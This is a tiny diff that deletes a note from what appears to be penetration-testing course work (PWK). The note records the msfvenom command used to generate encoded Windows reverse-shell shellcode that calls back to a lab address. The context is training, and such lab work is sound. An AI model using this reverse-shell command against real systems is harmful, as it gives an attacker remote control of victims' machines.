@@ -1,4 +1,0 @@
-SHELLCODE was made for personal use on the PWK course with the settings below. 
-
-msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.202 LPORT=443 -f c -a x86 --platform /
-windows -b x00x0ax0d -e x86/shikata_ga_nai > windows_reverse_shell_code
